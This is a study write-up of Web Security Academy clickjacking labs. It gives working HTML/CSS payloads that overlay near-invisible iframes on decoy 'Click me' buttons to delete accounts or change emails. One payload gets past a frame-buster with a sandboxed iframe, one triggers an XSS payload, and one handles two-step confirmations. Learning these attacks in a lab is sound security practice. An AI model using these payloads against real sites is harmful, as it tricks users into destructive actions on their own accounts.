- [What is Clickjacking?](#what-is-clickjacking)
- [Basic clickjacking with CSRF token protection](#basic-clickjacking-with-csrf-token-protection)
- [Clickjacking with form input data prefilled from a URL parameter](#clickjacking-with-form-input-data-prefilled-from-a-url-parameter)
- [Clickjacking with a frame buster script](#clickjacking-with-a-frame-buster-script)
- [Exploiting clickjacking vulnerability to trigger DOM-based XSS](#exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss)
- [Multistep clickjacking](#multistep-clickjacking)


---

# What is Clickjacking?

Is when an attacker use multiples transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top level page.

Example:
In a website exist a button that say "Free iPhone" but the attacker loaded an invisible iframe that do another action like change email.

If an attacker load [Flash plugin settin page](https://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager06.html) in a invisible frame can alterate the security settings of Flash, giving permission for any Flash animation to utilize the computer's microphone and camera.

----

# Basic clickjacking with CSRF token protection

In this case you have to use Chrome browser, if this doesn't work you can use Edge.

In the description of the lab indicate that the victim user will click on elements that display the word "click".

The idea is that a user delete his own account. For this we can try to use iframe in our exploit server:

```html
<style>
iframe {
width: 100%;
height: 100%;
}
</style>
<iframe src="https://0abd007c0302dd4080dc6740008d0041.web-security-academy.net/my-account"</iframe>
```

In this case the idea is to add some html structure above the structure:

```html
<style>
iframe {
width: 100%;
height: 100%;
}

div {
position: absolute;
top: 505px;
left: 40px;
}

</style>

<div>testeando</div>
<iframe src="https://0abd007c0302dd4080dc6740008d0041.web-security-academy.net/my-account"</iframe>
```

In this case we can use the position: absolute and adjust the position.

Now we can play with the opacity:

```html
<style>
iframe {
width: 100%;
height: 100%;
opacity: 0.0001;
}

div {
position: absolute;
top: 545px;
left: 70px;
}

</style>

<div>Click</div>
<iframe src="https://0abd007c0302dd4080dc6740008d0041.web-security-academy.net/my-account"</iframe>
```

# Clickjacking with form input data prefilled from a URL parameter

In this case we need to change the email of the victim that click the link, but we have a csrf parameter in POST, you can tray to change the method of the request, remove the csrf token, try with another value but nothing.

In the URL if you try to add `&email` parameter and send the request you see that in the form the the email is added to the input box but it has not been changed.

You can check in the exploit server:

```html
<iframe src="https://0adc00c404c507fc80f9037600a40010.web-security-academy.net/my-account?email=hacked@hacked.com" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;"></iframe>
```

With this, you can "bypass" the csrf token because we don't know how to bring it with us. The next step is create `<div>` above the button of change email and play with the opacity of the iframe.

```html
<style>
iframe {
height: 100vw;
width: 100vw;
top: 0;
left: 0;
border: none;
opacity: 0.0001;
}

div {
position: absolute;
top: 450px;
left: 70px;
}

</style>

<div>Click me</div>
<iframe src="https://0adc00c404c507fc80f9037600a40010.web-security-academy.net/my-account?email=pwned@pwned.com"></iframe>
```

# Clickjacking with a frame buster script

Frame buster or framekiller is a security mechanism to mitigate clickjacking attacks.

This lab is very similar to the previous one, but if you try to add the iframe doesn't work. In the iframe appear this message 'This page cannot be framed'.

This is because in the source code of the website you have a javascript code that deny this:

```js
if(top != self) { window.addEventListener("DOMContentLoaded", function() { document.body.innerHTML = 'This page cannot be framed'; }, false); }
```

But if we can load some policy that deny the execution of javascript code in the website. You can the attribute **sandbox** of iframe and use only the necessary.

The attribute sandbox start with minimal privilages by default.
Dont' allow to use:

- javscript code.
- Forms
- Browser out of the iframe
- Use local storage
- Start automatically downloads.

The form that send change the email doesn't use javascript, it's not necessary, in our exploit server we can try to load using this new attribute.

```html
<style>

iframe {
width: 100%;
height: 100%;
border: none;
opacity: 0.0001;
}

div {
position: absolute;
top: 450px;
left: 60px;
}

</style>

<div>Click me!</div>

<iframe sandbox="allow-forms" src="https://0af2009b0493bf2480a2035b002b00f3.web-security-academy.net/my-account?email=pwned@pwned.com"></iframe>
```

In this case we only allow `sandbox="allow-forms"` that allow the execution of forms in the iframe.

# Exploiting clickjacking vulnerability to trigger DOM-based XSS

In this case in the submit feedback page we have a vulnerable field to XSS, in this case is the name field.

```html
<img src=x onerror=print()>
```

But how we can trigger this XSS. 

If you inspect the code, you can try using the attribute name values and loading into the URL to see if are loaded into the input box.

> `https://0ae40046047f7ed98085f8c3003500aa.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=test@test.com&subject=test&message=test`

And it works, this load automatically in the fields.

```html
<style>
iframe {
width: 100%;
height: 100%;
border: none;
opacity: 0.0001;
}

div {
position: absolute;
top:832px;
left: 405px;
}

</style>

<div>Click me</div>
<iframe scrolling="no" src="https://0ae40046047f7ed98085f8c3003500aa.web-security-academy.net/feedback?name=%3Cimg%20src=0%20onerror=print()%3E&email=pwned@pwned.com&subject=test&message=testing"></iframe>
```

# Multistep clickjacking

In this laboratory we have a delete button, but the problem is that appear a confirmation dialog, to do this the "user" have to click two times. You can play with classes in css to place them in different locations.

```html
<style>
iframe {
height: 100%;
width: 100%;
border: none;
opacity: 0.0001;
}

.firstClick {
position: absolute;
top: 530px;
left: 400px;
}

.secondClick{
position: absolute;
top: 330px;
left: 550px;
}

</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0ab0007d04496ce180d612fc00150093.web-security-academy.net/my-account">
</iframe>
```
